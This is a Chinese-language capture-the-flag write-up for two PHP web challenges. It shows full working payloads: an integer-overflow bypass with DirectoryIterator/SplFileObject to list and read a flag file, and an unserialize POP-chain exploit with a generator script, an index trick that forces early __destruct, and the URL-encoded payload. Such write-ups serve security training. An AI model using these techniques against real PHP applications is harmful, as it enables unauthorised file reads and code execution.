## easy web

F12,发现`?source=`

打开，看源代码

```php
 <?php
error_reporting(0);
if(isset($_GET['source'])){
    highlight_file(__FILE__);
    echo "\$flag_filename = 'flag'.md5(???).'php';";
    die();
}
if(isset($_POST['a']) && isset($_POST['b']) && isset($_POST['c'])){
    $c = $_POST['c'];
    $count[++$c] = 1;
    if($count[] = 1) {
        $count[++$c] = 1;
        print_r($count);
        die();
    }else{
        $a = $_POST['a'];
        $b = $_POST['b'];
        echo new $a($b);
    }
}
?>
$flag_filename = 'flag'.md5(???).'php';
```

比较简单的代码，我们的利用点是`echo new $a($b)`

绕过这串代码

```php
<?php
$c = $_POST['c'];
$count[++$c] = 1;
if($count[] = 1) {
    $count[++$c] = 1;
    print_r($count);
    die();
}else{
    $a = $_POST['a'];
    $b = $_POST['b'];
    echo new $a($b);
}
```

###  数组溢出

我们利用`数组溢出`绕过，因为是64位操作系统，所以c赋值为`9223372036854775806`

怎么利用`echo new $a($b)`?

利用原生类来得到目录，读文件内容。

###  读文件目录

```
c=9223372036854775806&a=DirectoryIterator&b=glob://flag*.php
```

这个会发现读到的是flag.php,但是这个文件根本读取不到内容。

源码是`flag+md5(加密)+.php`，所以文件名应该不是这个。

查了下`glob://`，后面是根据正则表达式来匹配路径

*：表示0个或者大于0的字符

所以加个*是匹配不到的

我们这儿利用`?`(匹配一个字符)

payload：

```
c=9223372036854775806&a=DirectoryIterator&b=glob://flag?*.php
```

![image-20220301193656392](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203011937505.png)然后利用`SplFileObject`读取文件内容

```
a=SplFileObject&b=flag56ea8b83122449e814e0fd7bfb5f220a.php&c=9223372036854775806
```

可以看看这篇[原生类的总结](http://www.z3eyond.top:8099/index.php/archives/17/)

##  easy_unserialize

直接读源码

```
<?php
/**
 * @Author: F10wers_13eiCheng
 * @Date:   2022-02-01 11:25:02
 * @Last Modified by:   F10wers_13eiCheng
 * @Last Modified time: 2022-02-07 15:08:18
 */
include("./HappyYear.php");

class one {
    public $object;

    public function MeMeMe() {
        array_walk($this, function($fn, $prev){
            if ($fn[0] === "Happy_func" && $prev === "year_parm") {
                global $talk;
                echo "$talk"."</br>";
                global $flag;
                echo $flag;
            }
        });
    }

    public function __destruct() {
        @$this->object->add();
    }

    public function __toString() {
        return $this->object->string;
    }
}

class second {
    protected $filename;

    protected function addMe() {
        return "Wow you have sovled".$this->filename;
    }

    public function __call($func, $args) {
        call_user_func([$this, $func."Me"], $args);
    }
}

class third {
    private $string;

    public function __construct($string) {
        $this->string = $string;
    }

    public function __get($name) {
        $var = $this->$name;
        $var[$name]();
    }
}

if (isset($_GET["ctfshow"])) {
    $a=unserialize($_GET['ctfshow']);
    throw new Exception("高一新生报道");
} else {
    highlight_file(__FILE__);
}

```

稍微读了一下，一看就是pop链，先分析pop链

先构造链子

```
 public function __destruct() {
        @$this->object->add();
    }
```

我们使这儿`$this->object=new second`,add()为不能访问到的方法，直接触发`__call`

```
  public function __call($func, $args) {
        call_user_func([$this, $func."Me"], $args);
    }
```

call_user_func,调用类中的属性，`$func=add`，相当于就是把`filename`的值传给`addMe`方法中，进入`addMe()`

当`filename=new one`,触发`toString`,

```
 public function __toString() {
        return $this->object->string;
    }
```

令`$this->object=new third()`，就可以触发`__get`

```
 public function __get($name) {
        $var = $this->$name;
        $var[$name]();
    }
```

然后`__get`中

```
 $var=array('$name'=>[new one(),"MeMeMe"]); 就可以 $var[$name]=one::MeMeMe();
```

直接到`MeMeMe()`得到flag。

但是这儿需要注意的是：

__destruct()方法又叫析构函数，当程序结束销毁的时候自动调用，看下这道题中的代码

```
$a=unserialize($_GET['ctfshow']);
throw new Exception("高一新生报道");
```

这里有个throw函数，大概是抛出一个异常，然后让程序异常退出，这个时候就是未正常退出的情况，所以不会调用__destruct方法，这里我们就要想办法在throw函数执行之前调用析构函数，目前我知道的调用该函数的方法如下:

- 等待程序完整执行完毕，也就是解释完最后一行代码，这也是我们最常用的方法

- 利用GC回收机制，比如

  

```php
<?php
highlight_file(__FILE__);
class test{
    public function __destruct()
    {
        echo "Running method <destruct>";
    }
}
$a=new test();
// $a=null;
throw new Error("this is a test");
```

![image-20220301195606767](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203011956840.png)

加上`null`

```php
<?php
highlight_file(__FILE__);
class test{
    public function __destruct()
    {
        echo "Running method <destruct>";
    }
}
$a=new test();
$a=null;
throw new Error("this is a test");
```

![image-20220301195641203](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203011956274.png)

成功触发了`__destruct`

我们加上一个数组

```php
<?php
highlight_file(__FILE__);
class test{
    public function __destruct()
    {
        echo "Running method <destruct>";
    }
}
$a=new test();
$b=null;
$c=array($a,$b);
echo serialize($c);
throw new Error("this is a test");
```

得到

```
a:2:{i:0;O:4:"test":0:{}i:1;N;}
```

然后将上面序列化内容改为

```
a:2:{i:0;O:4:"test":0:{}i:0;N;}
```

就可以达到提前触发`__destruct()`



所以构造payload

```
<?php
class one {
    public $object;
    public $year_parm=array(0=>"Happy_func");
    public function MeMeMe() {
        array_walk($this, function($fn, $prev){
            if ($fn[0] === "Happy_func" && $prev === "year_parm") {
                global $flag;
                echo $flag;
            }
        });
    }
    public function __destruct() {
        @$this->object->add();
    }
    public function __toString() {
        return $this->object->string;
    }
}
class second {
    public $filename;
    protected function addMe() {
        return "Wow you have sovled".$this->filename;
    }
    public function __call($func, $args) {
        call_user_func([$this, $func."Me"], $args);
    }
}
class third {
    private $string;
    public function __construct($string) {
        $this->string = $string;
    }
    public function __get($name) {
        $var = $this->$name;
        $var[$name]();
    }
}
  $a=new one();
  $a->object=new second();
  $a->object->filename=new one();
  $a->object->filename->object=new third(['string'=>[new one(),'MeMeMe']]);
  $b=null;
  $c=array($a,$b);
echo serialize($c).PHP_EOL;

```

得到payload后，还需要改动下，那个1改为0，触发`__destruct`

```
a:2:{i:0;O:3:"one":2:{s:6:"object";O:6:"second":1:{s:8:"filename";O:3:"one":2:{s:6:"object";O:5:"third":1:{s:13:" third string";a:1:{s:6:"string";a:2:{i:0;O:3:"one":2:{s:6:"object";N;s:9:"year_parm";a:1:{i:0;s:10:"Happy_func";}}i:1;s:6:"MeMeMe";}}}s:9:"year_parm";a:1:{i:0;s:10:"Happy_func";}}}s:9:"year_parm";a:1:{i:0;s:10:"Happy_func";}}i:0;N;}
```

然后`urlencode`

```
a%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A6%3A%22object%22%3BO%3A6%3A%22second%22%3A1%3A%7Bs%3A8%3A%22filename%22%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A6%3A%22object%22%3BO%3A5%3A%22third%22%3A1%3A%7Bs%3A13%3A%22%00third%00string%22%3Ba%3A1%3A%7Bs%3A6%3A%22string%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A6%3A%22object%22%3BN%3Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7D%7Di%3A1%3Bs%3A6%3A%22MeMeMe%22%3B%7D%7D%7Ds%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7D%7D%7Ds%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7D%7Di%3A0%3BN%3B%7D
```

![image-20220301201206693](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203012012790.png)